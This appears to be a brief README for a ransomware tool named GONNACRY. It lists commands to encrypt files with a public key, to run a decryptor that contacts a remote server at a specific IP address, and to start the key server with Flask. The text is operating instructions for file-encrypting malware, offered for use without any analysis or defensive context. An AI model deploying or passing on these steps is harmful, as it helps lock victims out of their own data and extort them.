# GONNACRY
Encrypt:
./gonnacry <public_key_file> (Example: ./gonnacry public_key.key)
Decrypt:
./decryptor <server_address>/decrypt (Example: ./decryptor http://159.89.167.9:8000/decrypt)
Server:
pip3 install flask
python3 server.py